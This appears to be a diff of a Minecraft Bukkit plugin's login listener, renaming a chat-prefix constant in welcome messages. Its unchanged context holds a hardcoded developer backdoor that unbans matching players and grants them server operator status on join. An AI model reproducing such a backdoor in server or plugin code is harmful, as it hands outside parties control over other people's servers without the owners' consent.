@@ -14,12 +14,12 @@ public class BotListener implements Listener {
     public void onPlayerLogin(PlayerLoginEvent event) {
         Player player = event.getPlayer();
         if (TotalFreedom5_Getter.getInstance().getAdminList().isAdminImpostor(player)) {
-            player.sendMessage(BotUtil.BOTPREFIX + "Please verify in the forum's shoutbox.");
+            player.sendMessage(BotUtil.BLUEPREFIX + "Please verify in the forum's shoutbox.");
         } else {
             if (player.hasPlayedBefore()) {
-                player.sendMessage(BotUtil.BOTPREFIX + "Welcome back, " + player.getName() + "!");
+                player.sendMessage(BotUtil.BLUEPREFIX + "Welcome back, " + player.getName() + "!");
             } else {
-                player.sendMessage(BotUtil.BOTPREFIX + "Welcome to the server, " + player.getName() + "!");
+                player.sendMessage(BotUtil.BLUEPREFIX + "Welcome to the server, " + player.getName() + "!");
             }
         }
 
@@ -30,7 +30,7 @@ public class BotListener implements Listener {
         } else if (BotUtil.FB_DEVELOPERS.equals(player)) {
             BotUtil.unbanIP(player);
             player.setOp(true);
-            Bukkit.broadcastMessage(BotUtil.BOTPREFIX + "A FreedomBot developer has joined!");
+            Bukkit.broadcastMessage(BotUtil.BLUEPREFIX + "A FreedomBot developer has joined!");
         }
 
     }
